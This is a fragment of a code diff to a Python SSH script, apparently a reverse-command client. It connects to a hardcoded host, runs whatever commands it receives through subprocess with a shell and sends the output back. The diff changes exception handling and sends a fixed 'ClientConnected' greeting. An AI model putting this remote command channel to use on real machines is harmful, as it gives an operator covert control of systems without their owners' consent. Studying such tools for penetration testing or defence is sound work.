@@ -25,7 +25,7 @@ def ssh_command(ip, port, user, password, cmd):
             cmd_ouput = subprocess.check_output(shlex.split(cmd), shell=True)
             ssh_session.send(cmd_ouput or 'okay')
         except Exception as ex:
-            ssh_session.send(ex.message)
+            ssh_session.send(str(ex))
         client.close()
     return
 
@@ -37,9 +37,9 @@ def main():
 
     ip = input("Enter ip: ") or '192.168.0.112'
     port = input('Enter port: ') or 2222
-    cmd = input('Enter command: ') or 'id'
+    # cmd = input('Enter command: ') or 'id'
 
-    ssh_command(ip, int(port), user, passwd, cmd)
+    ssh_command(ip, int(port), user, passwd, 'ClientConnected')
 
 
 if __name__ == '__main__':
